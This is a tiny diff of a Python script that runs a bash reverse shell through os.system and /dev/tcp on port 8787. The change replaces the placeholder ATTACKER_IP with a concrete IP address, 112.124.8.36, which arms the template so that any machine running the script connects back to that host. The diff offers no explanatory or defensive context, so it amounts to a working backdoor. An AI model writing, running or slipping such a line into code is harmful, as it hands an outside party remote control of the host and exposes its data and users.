@@ -1,3 +1,3 @@
 import os
 
-os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/8787 0>&1' &")
+os.system("bash -c 'bash -i >& /dev/tcp/112.124.8.36/8787 0>&1' &")
